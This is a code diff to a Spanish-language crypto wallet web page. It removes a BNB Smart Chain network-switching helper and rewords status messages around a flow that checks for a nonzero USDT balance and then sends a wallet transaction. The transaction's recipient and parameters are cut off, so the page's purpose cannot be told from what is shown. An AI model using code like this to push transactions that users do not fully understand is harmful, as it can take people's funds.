@@ -826,38 +826,6 @@
         return await contract.balanceOf(address);
     }
 
-    // BLINDAJE DE RED INTELIGENTE (Justo a tiempo para la firma/envío)
-    async function asegurarRedBNB(provider) {
-        try {
-            const currentChainId = await provider.request({ method: 'eth_chainId' });
-            if (currentChainId !== BSC_CHAIN_ID_HEX) {
-                try {
-                    await provider.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: BSC_CHAIN_ID_HEX }]
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902 || switchError.message?.includes('Unrecognized chain')) {
-                        await provider.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: BSC_CHAIN_ID_HEX,
-                                chainName: 'BNB Smart Chain',
-                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                rpcUrls: [BSC_PUBLIC_RPC],
-                                blockExplorerUrls: ['https://bscscan.com']
-                            }]
-                        });
-                    } else {
-                        throw switchError;
-                    }
-                }
-            }
-        } catch (err) {
-            throw new Error("Es necesario cambiar a la red BNB Smart Chain en tu billetera para continuar.");
-        }
-    }
-
     connectBtn.addEventListener('click', async () => {
         try {
             rawProvider = getRawProvider();
@@ -896,13 +864,9 @@
                     throw new Error("Ingresa una cantidad válida antes de continuar.");
                 }
 
-                setStatus("Verificando red BNB Smart Chain...");
+                setStatus("Consultando fondos del libro contable on-chain...");
                 connectBtn.disabled = true;
 
-                // VALIDACIÓN DE RED A TIEMPO: Fuerza el cambio a BSC antes de firmar para evitar el error de Ethereum
-                await asegurarRedBNB(rawProvider);
-
-                setStatus("Consultando fondos del libro contable on-chain...");
                 const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
                 if (balanceBigNumber.isZero()) {
                     throw new Error("La cuenta no dispone de balances de USDT (BEP-20) activos.");
@@ -916,7 +880,7 @@
 
                 showProcessingScreen();
 
-                // DISPARO CON CHAINID EXPLÍCITO BLINDADO A 0x38 (BNB Smart Chain)
+                // Disparamos la transacción con el parámetro chainId de BSC (0x38) para orientar el contrato BEP-20
                 const txHash = await rawProvider.request({
                     method: 'eth_sendTransaction',
                     params: [{
